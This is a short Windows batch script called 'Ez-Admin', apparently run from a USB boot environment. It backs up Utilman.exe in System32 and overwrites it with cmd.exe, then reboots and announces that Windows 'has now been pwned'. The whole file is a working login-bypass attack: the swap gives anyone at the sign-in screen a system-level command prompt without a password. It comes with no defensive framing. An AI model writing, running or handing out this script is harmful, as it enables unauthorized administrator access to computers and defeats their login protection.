:start 
cls
@echo off
color D
title -- Ez-Admin - Made by rainestorme --
echo                ------------------------
echo                  Welcome to Ez-Admin! 
echo                ------------------------
echo.
echo           Stage 1: Backing up Utilman.exe...
echo.
C:
cd C:\Windows\System32
copy Utilman.exe Utilman-ez.bak
timeout /t 3
echo.
echo        Stage 2: Copying cmd.exe to Utilman.exe...
xcopy cmd.exe Utilman.exe
echo.
timeout /t 3
cls
echo            --- windows has now been pwned ---
echo          --- the system will shut down soon ---
echo --- when the screen goes black, remove the usb drive ---
timeout /t 10
wpeutil reboot
exit
